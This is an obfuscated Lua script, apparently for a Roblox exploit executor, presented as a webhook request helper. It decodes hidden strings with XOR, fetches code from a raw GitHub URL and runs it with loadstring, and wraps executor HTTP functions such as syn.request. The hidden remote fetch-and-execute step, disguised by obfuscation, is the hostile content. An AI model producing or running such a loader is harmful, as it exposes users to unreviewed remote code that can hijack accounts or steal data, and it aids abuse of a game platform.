--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.19) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v12,v13)local v14={};for v17=1, #v12 do v6(v14,v0(v4(v1(v2(v12,v17,v17 + 1 )),v1(v2(v13,1 + (v17% #v13) ,1 + (v17% #v13) + 1 )))%256 ));end return v5(v14);end loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/Webhook/main/Anti.lua"))();local v8=http_request or request or HttpPost or syn.request ;local v9=game:GetService(v7("\249\215\207\53\213\190\213\8\216\192\222","\126\177\163\187\69\134\219\167"));local v10={};v10.new=function(v15,v16)v8(v15,v16);end;return v10;
